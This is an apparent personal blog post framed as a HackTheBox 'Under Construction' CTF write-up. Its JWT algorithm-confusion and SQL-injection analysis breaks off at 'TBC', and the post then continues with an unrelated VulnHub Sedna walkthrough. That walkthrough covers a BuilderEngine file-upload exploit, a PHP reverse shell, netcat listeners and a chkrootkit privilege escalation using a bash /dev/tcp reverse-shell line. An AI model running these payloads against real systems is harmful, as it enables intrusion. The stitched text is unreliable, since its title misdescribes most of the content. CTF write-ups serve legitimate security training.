---
layout: post
title: PenLog - Under Construction by HackTheBox
categories: [HackTheBox, Penlog, Write Up, CTF, Challenge, Tracks]
---

## Details

**Platform:** [HackTheBox](https://www.hackthebox.eu/)\
**Difficulty:** Medium\
**Link:** [Under Construction](https://app.hackthebox.eu/challenges/111)

## Enumeration

With the instance started and the challenge package downloaded, navigate to the web app:

![under-construction](/images/posts/penlog_under_construction_by_hackthebox/under_construction.png)
_(**Note:**: The IP address and port is supplied via the challenge "Start instance" page.)_

Enter a "test" user username and password and click register: _test:test_.

![register](/images/posts/penlog_under_construction_by_hackthebox/register.png)

Start `Burp Suite` proxy and configure the browser's HTTP proxy:

![firefox-proxy](/images/posts/penlog_under_construction_by_hackthebox/firefox_proxy.png)

With `Burp` intercepting via the configured proxy, login to the web app with the registered test account:

![login](/images/posts/penlog_under_construction_by_hackthebox/login.png)

Via `Burp`, "Forward" the login request:

![burp-login-request](/images/posts/penlog_under_construction_by_hackthebox/burp_login_request.png)

Again, via `Burp`, send the redirect request, including the "Cookie: session=" token to `Burp`'s "Repeater":

![burp-redirect-request](/images/posts/penlog_under_construction_by_hackthebox/burp_redirect_request.png)
_(**Note:**: Press ctrl-R to send the request to `Burp`s repeater.)_

Perusing the provided web app's (`expressjs`) source code, the above session cookie, or, "token", is generated and sent as a HTTP redirect response in "routes/index.js":

![login-token](/images/posts/penlog_under_construction_by_hackthebox/login_token.png)

Googling "JWT token", this authentication technology is known as [JSON Web Token](https://en.wikipedia.org/wiki/JSON_Web_Token). This is further evidenced in "helpers/JWTHelper.js" with the `requires` declaration:

![login-token](/images/posts/penlog_under_construction_by_hackthebox/requires_jsonwebtoken.png)

Copy the JWT token from the session cookie in `Burp`'s repeater, and use [jwt.io](https://jwt.io) to decode it. Note the "alg" type "RS256" and that the payload data includes a public key block:

![token-decoded](/images/posts/penlog_under_construction_by_hackthebox/token_decoded.png)

Googling "jsonwebtoken vulnerabilities", this library is vulnerable to "Authentication Bypass" as described [here](https://snyk.io/test/npm/jsonwebtoken/4.0.0#npm:jsonwebtoken:20150331).

Specifically, this vulnerability is known as [CVE-2015-9235](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-9235) and describes "JWT HS/RSA key confusion vulnerability" where the vulnerable server side successfully verifies a token by erroneously:
1. Expecting "RSA" (public-private key scheme), but instead receiving "HSA256"(symmetric-key scheme); _an attacker can easily forge a token with an updated "alg"_
2. Blindly passing the re-purposed public-key as the verification key to the server side verification method, confusing the _known_ public-key as the verification key for HS256

This is further evidenced as a likely vector since, as shown above, the decoded JWT token's payload includes the known public-key.

Spending more time perusing the source code, there also looks to be a simple SQL injection in "helpers/DBHelper.js" which interfaces with an SQLite3 databases to store and retrieve user's with unsanitised user input `${username}`:

![login-token](/images/posts/penlog_under_construction_by_hackthebox/sqli_username.png)


TBC 


From `Burp`'s "Repeater", copy the JWT token:



//////////////////////////////////////////

Run `dirbuster` against the target's open http port 80 using the _/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt_ wordlist and
options _Be Recursive_ switched off, and _File extension_ set to _html, php, txt_.

**Note:** **/licence.txt** in the result; navigate to this in the browser and notice the line:

    Copyright (c) 2012 - 2015 BuilderEngine / Radian Enterprise Systems Limited.

Continuing through the `DirBuster` results, **Note:** **/finder.html**, which, when navigated to in the browser,
has the title: **elFinder 2.0**.

Searching Google, there is a **BuilderEngine** project on GitHub at [tripflex/builder-engine]() with the
description: _"Open source CMS HTML 5 website builder."_

Taking a chance on this, use `searchsploit` and evaluate results:

```bash
$ searchsploit enginebuilder
...
```

![searchsploit](/images/posts/penlog_sedna_by_vulnhub/searchsploit_enginebuilder.png)

Download the non-Metasploit PoC with EDB-ID [40390](https://www.exploit-db.com/exploits/40390):

```bash
$ searchsploit -m 40390
```

### 40390 Description

40390 reports EngineBuilder v3.5.0 as having a Remote Code Execution vulnerability; reading the PoC, it describes the ability to perform Arbitrary File Upload via unauthenticated, unrestricted access to a bundled jQuery File Upload plugin _/themes/dashboard/assets/plugins/jquery-file-upload_.

With this file upload capability, upload a reverse PHP shell--the website is serving PHP--to establish a low-privilege _user_ shell.

## User Shell

Copy 40390, changing the extension from _.php_ to _.html_:

```bash
$ cp 40390.{php,html}
```

Update the PoC's action string to instead include the target IP address:

```bash
$ diff 40390.html 40390.php
22c22
< <form method="post" action="http://192.168.42.130/themes/dashboard/assets/plugins/jquery-file-upload/server/php/" enctype="multipart/form-data">
---
> <form method="post" action="http://localhost/themes/dashboard/assets/plugins/jquery-file-upload/server/php/" enctype="multipart/form-data">
27c27
< </html>
---
> </html>
\ No newline at end of file
```

Copy _/usr/share/webshells/php/php-reverse-shell.php_ from Kali's bundled webshells and update the connect back IP address/port to be the attacking IP address/port:

![php-webshell](/images/posts/penlog_sedna_by_vulnhub/php_webshell.png)

Serve the _html_ version of 40390 locally and upload the modified _php-reverse-shell.php_:

![40390-upload](/images/posts/penlog_sedna_by_vulnhub/40390_upload.png)

As **Note:**d in the documentation, 40390 advises that the uploaded shell will be accessible via _/files_:

![files-list](/images/posts/penlog_sedna_by_vulnhub/files_list.png)

Start an `nc` lister on the port that was added to the modified _php-reverse-shell.php_:

```bash
$ nc -vnlp 4444
```

Click the _php-reverse-shell.php_ link in the browser and establish a reverse shell connection:

![user-shell](/images/posts/penlog_sedna_by_vulnhub/user_shell.png)
_(****Note:**:** "reverse" in the above is a bash alias for `nc -vnlp 4444`.)_

Get the user _flag.txt_:

![user-flag](/images/posts/penlog_sedna_by_vulnhub/user_flag.png)

Lastly, upgrade the shell with a PTY:

```bash
$ python -c 'import pty; pty.spawn("/bin/bash")'
$ (Ctrl-Z)
$ stty raw -echo
$ fg
$ export TERM=xterm && reset
```

(After spending an hour looking at some other installed, vulnerable software, and attempting _Dirty Cow_ for this vulnerable _Linux Kernel v3.13.0-32_, I discovered a vector via `cron`.)

Upload and execute custom `cronmon.sh`:

```bash
$ cat cronmon.sh
#!/bin/bash

#IFS=$'\n'

old_process=$(ps -eo command)  # sort by command (-o)

while true; do
    new_process=$(ps -eo command)
    diff <(echo "$old_process") <(echo "$new_process")
    sleep .2
    old_process=$new_process
done
```

After a while, notice `chkrootkit` in the output, running as **root**:

![chkrootkit-cron-root](/images/posts/penlog_sedna_by_vulnhub/chkrootkit_cron_root.png)

Notice path _/etc/chkrootkit_ on target (non-standard) and version string in _/etc/chkrootkit/README_:

```bash
$ cat /etc/chkrootkit/README
...
 09/30/2009 - Version 0.49  new tests: Mac OS X OSX.RSPlug.A.  Enhanced
                            tests: suspicious sniffer logs, suspicious
                            PHP files, shell history file anomalies.
                            Bug fixes in chkdirs.c, chkproc.c and
                            chkutmp.c.
```

Search for a local privilege escalation with `searchsploit` and download the non-Metasploit PoC **33899**:

![33899-chkrootkit](/images/posts/penlog_sedna_by_vulnhub/33899_chkrootkit.png)
_(****Note:**:** "ss" in the above is a bash alias for `searchsploit`.)_

### 33899 Description

33899 reports chkrootkit v0.49 as having a vulnerable function that will execute files specified in a variable due to unquoted variable assignment. The PoC goes on to describe _"Steps to reproduce"_:
- Put an executable file named 'update' in /tmp
- Run chkrootkit (as uid 0)

## Root Shell

Follow the instructions and put the file with a bash reverse shell to attacking machine:

```bash
$ echo "bash -i >& /dev/tcp/192.168.42.129/4445 0>&1" > /tmp/update
$ chmod +x /tmp/update
```

Start `nc` listener on the attacking machine, specifying expected reverse shell port (4445 in this case):

```bash
$ nc -vnlp 4445
```

Wait for `cron` to execute `chkrootkit` as root; reading _/etc/crontab_, the root _/etc/cron.hourly_ will run every **17 min**:

![root-cron-hourly](/images/posts/penlog_sedna_by_vulnhub/root_cron_hourly.png)

After _/tmp/update_ is executed as _root_ via the `cron` call to `chkrootkit`, get the root _flag.txt_ via the established root shell:

![root-shell](/images/posts/penlog_sedna_by_vulnhub/root_shell.png)
